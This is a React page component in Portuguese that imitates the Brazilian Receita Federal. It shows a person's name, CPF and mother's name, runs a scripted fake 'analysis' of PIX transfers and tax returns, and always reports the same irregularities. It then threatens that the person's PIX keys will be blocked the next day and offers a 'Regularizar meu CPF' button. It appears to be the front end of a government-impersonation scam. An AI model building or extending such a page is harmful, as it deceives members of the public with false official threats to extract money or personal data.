
import React, { useEffect, useState, useRef } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { Button } from "@/components/ui/button";
import { User, IdCard, Calendar, FileText, ArrowLeft, CheckCircle, AlertTriangle, Search, Clock, LoaderCircle } from "lucide-react";
import { toast } from 'sonner';
import PageLayout from '@/components/PageLayout';
import { ScrollArea } from "@/components/ui/scroll-area";

const UserData: React.FC = () => {
  const [userData, setUserData] = useState<any>(null);
  const [loading, setLoading] = useState<boolean>(false);
  const [showVerification, setShowVerification] = useState<boolean>(false);
  const [analysisComplete, setAnalysisComplete] = useState<boolean>(false);
  const [analysisSteps, setAnalysisSteps] = useState<{title: string, detail: string}[]>([]);
  const stepsContainerRef = useRef<HTMLDivElement>(null);
  const navigate = useNavigate();
  const location = useLocation();
  
  useEffect(() => {
    if (location.state && location.state.userData) {
      setUserData(location.state.userData);
    } else {
      toast.error("Nenhum dado encontrado. Por favor, faça a consulta novamente.");
      navigate('/');
    }
  }, [location.state, navigate]);
  
  useEffect(() => {
    if (stepsContainerRef.current && analysisSteps.length > 0) {
      stepsContainerRef.current.scrollIntoView({ behavior: 'smooth', block: 'end' });
    }
  }, [analysisSteps]);

  const formatDate = (dateString: string) => {
    if (!dateString) return null;
    const date = new Date(dateString);
    return date.toLocaleDateString('pt-BR');
  };

  const getStepIcon = (step: string) => {
    if (step.includes("CPF")) {
      return <Search className="h-4 w-4 text-govblue-600 flex-shrink-0" />;
    } else if (step.includes("transferências") || step.includes("movimentações")) {
      return <Clock className="h-4 w-4 text-govblue-600 flex-shrink-0" />;
    } else if (step.includes("declarações") || step.includes("registros") || step.includes("histórico")) {
      return <FileText className="h-4 w-4 text-govblue-600 flex-shrink-0" />;
    } else {
      return <LoaderCircle className="h-4 w-4 text-govblue-600 flex-shrink-0" />;
    }
  };

  const handleConfirmData = () => {
    setShowVerification(true);
    
    const steps = [
      {
        title: "Análise do CPF",
        detail: "Verificando situação fiscal e cadastral"
      },
      {
        title: "Transferências PIX",
        detail: "Analisando histórico desde 2019"
      },
      {
        title: "Movimentações financeiras",
        detail: "Verificando transações desde 2020"
      },
      {
        title: "Declarações de IR",
        detail: "Consultando últimas declarações"
      },
      {
        title: "Cartão de Crédito",
        detail: "Analisando registros e faturamentos"
      },
      {
        title: "Histórico tributário",
        detail: "Verificando declarações anteriores"
      },
      {
        title: "Lista da Receita Federal",
        detail: "Consultando restrições e pendências"
      }
    ];
    
    setLoading(true);
    setAnalysisSteps([]);
    
    let currentStep = 0;
    const processStep = () => {
      if (currentStep < steps.length) {
        setAnalysisSteps(prevSteps => [...prevSteps, steps[currentStep]]);
        toast.info(`${steps[currentStep].title}: ${steps[currentStep].detail}`);
        currentStep++;
        setTimeout(processStep, 1500 + Math.random() * 500);
      } else {
        setLoading(false);
        setAnalysisComplete(true);
      }
    };
    
    processStep();
  };

  const handleRegularize = () => {
    toast.info("Funcionalidade de regularização ainda não implementada.");
  };

  const handleGoBack = () => {
    navigate('/');
  };

  if (!userData) {
    return (
      <PageLayout>
        <div className="flex justify-center items-center">
          <p>Carregando dados...</p>
        </div>
      </PageLayout>
    );
  }

  return (
    <PageLayout>
      <div className="container max-w-xl mx-auto px-6 pt-1 pb-6 relative">
        <div className="absolute top-0 left-0 mt-2 ml-0">
          <Button
            variant="ghost"
            size="icon"
            onClick={handleGoBack}
            className="text-gray-500 hover:text-gray-700 hover:bg-transparent"
          >
            <ArrowLeft className="h-5 w-5" />
          </Button>
        </div>
        
        <div className="glass-card rounded-xl p-8 animate-fade-in mt-6">
          {!showVerification ? (
            <>
              <h2 className="font-heading text-xl font-semibold text-gray-800 mb-6">
                Dados do Contribuinte
              </h2>
              
              <div className="space-y-4 mb-8">
                <div className="flex items-center border-b border-gray-200 py-3">
                  <User className="h-5 w-5 text-govblue-600 mr-3" />
                  <div>
                    <div className="text-sm text-gray-500">Nome Completo</div>
                    <div className="font-medium">{userData.nome}</div>
                  </div>
                </div>
                
                <div className="flex items-center border-b border-gray-200 py-3">
                  <IdCard className="h-5 w-5 text-govblue-600 mr-3" />
                  <div>
                    <div className="text-sm text-gray-500">CPF</div>
                    <div className="font-medium">{userData.cpf}</div>
                  </div>
                </div>
                
                {userData.data_nascimento && (
                  <div className="flex items-center border-b border-gray-200 py-3">
                    <Calendar className="h-5 w-5 text-govblue-600 mr-3" />
                    <div>
                      <div className="text-sm text-gray-500">Data de Nascimento</div>
                      <div className="font-medium">{formatDate(userData.data_nascimento)}</div>
                    </div>
                  </div>
                )}
                
                {userData.nome_mae && (
                  <div className="flex items-center border-b border-gray-200 py-3">
                    <FileText className="h-5 w-5 text-govblue-600 mr-3" />
                    <div>
                      <div className="text-sm text-gray-500">Nome da Mãe</div>
                      <div className="font-medium">{userData.nome_mae}</div>
                    </div>
                  </div>
                )}
              </div>
              
              <div className="flex justify-center">
                <Button
                  className="gov-button rounded-full px-4 py-3 text-base w-full max-w-md"
                  onClick={handleConfirmData}
                >
                  <CheckCircle className="mr-2 h-4 w-4 flex-shrink-0" />
                  <span>Confirmar meus dados</span>
                </Button>
              </div>
            </>
          ) : !analysisComplete ? (
            <div className="py-2">
              <h3 className="text-govblue-700 font-medium mb-2 text-center">Análise em andamento...</h3>
              
              <ScrollArea className="h-[40vh] w-full pr-2 mb-6">
                <div className="space-y-2 w-full" ref={stepsContainerRef}>
                  {analysisSteps.map((step, index) => (
                    <div 
                      key={index} 
                      className="flex items-start bg-white border border-gray-100 rounded-md py-3 px-4 shadow-sm mb-2 overflow-visible w-full"
                    >
                      <div className="bg-gray-50 p-1.5 rounded-md mr-3 mt-1">
                        {getStepIcon(step.title)}
                      </div>
                      <div className="flex-1 min-w-0">
                        <div className="font-medium text-sm text-gray-800">{step.title}</div>
                        <div className="text-sm text-gray-500 break-words">{step.detail}</div>
                      </div>
                    </div>
                  ))}
                </div>
              </ScrollArea>
              
              <div className="flex justify-center mt-4">
                <div className="animate-spin rounded-full h-10 w-10 border-b-2 border-govblue-600"></div>
              </div>
            </div>
          ) : (
            <>
              <h2 className="font-heading text-xl font-semibold text-red-600 mb-6">
                Pendências Identificadas
              </h2>
              
              <div className="mb-4">
                <div className="text-sm font-medium">Nome: {userData.nome}</div>
                <div className="text-sm font-medium">CPF: {userData.cpf}</div>
              </div>
              
              <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-6">
                <div className="font-medium text-red-700 mb-2">Pendências identificadas junto à Receita Federal:</div>
                
                <div className="mb-3">
                  <strong>Ano 2023</strong>
                  <div className="mt-1 text-sm">
                    • Divergências na declaração de renda<br />
                    • Inconsistências nos valores declarados
                  </div>
                </div>
                
                <div>
                  <strong>Ano 2024</strong>
                  <div className="mt-1 text-sm">
                    • Movimentações financeiras incompatíveis<br />
                    • Transações não declaradas identificadas
                  </div>
                </div>
              </div>
              
              <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-6 text-sm">
                <p className="text-yellow-800">
                  Comunicamos que, devido às irregularidades identificadas, o contribuinte estará na 
                  Lista de Bloqueio da Receita Federal a partir de {
                    new Date(new Date().setDate(new Date().getDate() + 1)).toLocaleDateString('pt-BR')
                  }. 
                  Todas as chaves PIX serão bloqueadas, impossibilitando a realização e recebimento de transferências via PIX.
                </p>
              </div>
              
              <div className="flex justify-center">
                <Button 
                  className="bg-red-600 hover:bg-red-700 rounded-full px-4 py-3 text-base w-full max-w-md"
                  onClick={handleRegularize}
                >
                  <AlertTriangle className="mr-2 h-4 w-4 flex-shrink-0" />
                  <span>Regularizar meu CPF</span>
                </Button>
              </div>
            </>
          )}
        </div>
      </div>
    </PageLayout>
  );
};

export default UserData;
